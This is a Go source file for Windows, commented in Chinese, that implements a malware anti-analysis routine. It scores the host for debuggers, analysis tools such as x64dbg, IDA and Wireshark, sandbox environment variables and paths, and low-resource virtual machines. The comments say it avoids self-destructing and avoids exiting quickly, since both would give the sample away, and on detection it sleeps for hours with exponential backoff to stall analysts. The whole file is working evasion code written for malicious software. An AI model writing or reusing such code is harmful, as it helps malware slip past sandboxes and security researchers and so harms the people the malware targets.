//go:build windows

package main

import (
	"os"
	"runtime"
	"strings"
	"time"
)

// 反分析按加权打分，任意单项命中都不足以动手，避免沙箱里误判自毁暴露样本。
var debuggerProcesses = []string{
	"x64dbg.exe", "x32dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
	"idag.exe", "idag64.exe", "windbg.exe", "immunity debugger.exe",
	"processhacker.exe", "procmon.exe", "procmon64.exe", "procexp.exe",
	"procexp64.exe", "wireshark.exe", "fiddler.exe", "httpdebugger.exe",
	"cheatengine-x86_64.exe", "cheatengine.exe", "dnspy.exe", "scylla.exe",
	"lordpe.exe", "pe-bear.exe", "pestudio.exe", "dumpit.exe",
	"megadumper.exe", "x64dbg", "api monitor.exe", "apimonitor.exe",
	"regshot.exe", "autoruns.exe", "autorunsc.exe", "tcpview.exe",
	"dumpcap.exe", "hookshark.exe", "sandboxie.exe", "sbiectrl.exe",
}

var debuggerWindowFragments = []string{
	"x64dbg", "x32dbg", "ollydbg", "immunity debugger", "windbg",
	"ida - ", "ida pro", "process hacker", "process monitor",
	"process explorer", "wireshark", "http debugger", "fiddler",
	"cheat engine", "scylla", "pestudio", "dnspy", "api monitor",
	"regshot", "autoruns", "tcpview", "sandboxie control",
}

var analysisEnvVars = []string{
	"SANDBOXIE", "SBIE_PROCESS", "CUCKOO", "CAPE_", "WINE_",
	"PROCESSOR_IDENTIFIER", "VBOX_", "VMWARE_", "ANALYSIS_",
}

func analysisReport() (int, []string) {
	score := 0
	var hits []string

	add := func(n int, why string) {
		score += n
		hits = append(hits, why)
	}

	if isDebuggerPresent() {
		add(3, "IsDebuggerPresent")
	}
	if remoteDebuggerPresent() {
		add(3, "CheckRemoteDebuggerPresent")
	}
	if processDebugPort() {
		add(2, "NtQueryInformationProcess:DebugPort")
	}
	if processDebugObjectHandle() {
		add(2, "NtQueryInformationProcess:DebugObjectHandle")
	}
	if processDebugFlags() {
		add(2, "NtQueryInformationProcess:DebugFlags")
	}

	// 断点单步会在两次 QPC 之间留下巨大的时间差
	t0 := qpc()
	sum := 0
	for i := 0; i < 200000; i++ {
		sum += i * 3
	}
	if sum == -1 {
		os.Stdout.WriteString("")
	}
	t1 := qpc()
	if t1-t0 > 200000 {
		add(1, "timing-anomaly")
	}

	procs := strings.ToLower(strings.Join(processList(), "\n"))
	for _, p := range debuggerProcesses {
		if strings.Contains(procs, p) {
			add(3, "proc:"+p)
			break
		}
	}

	wins := strings.ToLower(strings.Join(windowTitles(), "\n"))
	for _, w := range debuggerWindowFragments {
		if strings.Contains(wins, w) {
			add(2, "window:"+w)
			break
		}
	}

	for _, e := range analysisEnvVars {
		if strings.HasPrefix(e, "PROCESSOR_IDENTIFIER") {
			continue
		}
		if v := os.Getenv(e); v != "" {
			add(2, "env:"+e)
			break
		}
	}

	// 资源贫瘠的样本分析机
	if runtime.NumCPU() < 2 {
		add(1, "cpu<2")
	}
	if threadCount() < 25 {
		add(1, "few-processes")
	}

	// 常见沙箱路径里运行
	exe, _ := os.Executable()
	low := strings.ToLower(exe)
	for _, frag := range []string{"\\sandbox\\", "\\cuckoo\\", "\\analysis\\", "\\sample\\", "\\virus\\", "\\malware\\", "\\temp\\rars"} {
		if strings.Contains(low, frag) {
			add(2, "path:"+frag)
			break
		}
	}

	// 系统盘不是 C 盘基本可以确定是分析环境
	if len(low) > 1 && low[0] != 'c' {
		add(1, "non-c-drive")
	}

	return score, hits
}

// 命中后不退出——秒退本身就是强恶意特征。改成指数退避长休眠，把分析窗口拖死。
func backoffSleep(round int) {
	base := 47 * time.Minute
	if round > 6 {
		round = 6
	}
	d := base << uint(round)
	if d > 12*time.Hour {
		d = 12 * time.Hour
	}
	time.Sleep(d)
}
